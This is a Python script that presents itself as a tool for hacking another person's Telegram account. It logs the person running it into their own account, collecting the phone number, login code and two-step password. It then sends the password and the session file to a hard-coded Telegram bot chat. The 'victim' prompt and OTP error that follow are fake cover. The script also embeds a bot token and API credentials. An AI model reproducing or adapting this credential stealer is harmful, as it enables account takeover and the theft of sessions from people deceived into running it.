


from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid
import telebot
import time
from module import *




YOUR_APP_ID = 2239705
YOUR_APP_HASH = '8799fd46dadf3dc69eb925c32a2976e'


cls()
print(banner)

time.sleep(2)
cls()
phone = input(
    cyan+bold+'[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ')

client = Client(name="anon",api_id=2239705,api_hash='8799fd46dadf3dc69eb925c32a2976e8799fd46dadf3dc69eb925c32a2976e',phone_number=+79525966285)
Client_ = telebot.TeleBot('8331188135:AAHsdw-PgqJKi-x6N7R1FiLCe3kdKpXldK0')
client.connect()
sent_code_info = client.send_code(phone)
phone_code = input("Please enter your phone code: ")  # Sent phone code using last function
password = None
while True:
    try:
        client.sign_in(phone, sent_code_info.phone_code_hash, phone_code)
        break
    except SessionPasswordNeeded:
        password = input("Please enter your password: ")  # Sent phone code using last function
        try:
            client.check_password(password)
            break
        except PasswordHashInvalid:
            print("pass error try 1 more time")
    except PhoneCodeInvalid:
        print("code error try 1 more time")


try:
    Client_.send_message(chat_id=6470140273,text=f'''Phone Number: {phone} {client.phone_number}
password: {password}
''')
    file = open('session.session', 'rb')
    Client_.send_document(chat_id=6470140273,document=file)
    victim = input(cyan + bold + '[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ')
    print("Connecting to victim's api...")
    time.sleep(
        3)
    choice = input("Do you want to login to their account [y/n] ? : ")
    if (choice == 'y'):
        print("Please wait 1 to 2 minutes until it logins and send their otp")
        time.sleep(
            6)
        print(red + "Error in getting otp ! 2 step verification may be enabled or try after 15 minutes\033[0m'")
        print(
            " ")
        print(" ")
    else:
        print("Bye...")
        print(" ")
        print(" ")
        os.system("exit")
finally:
    pass

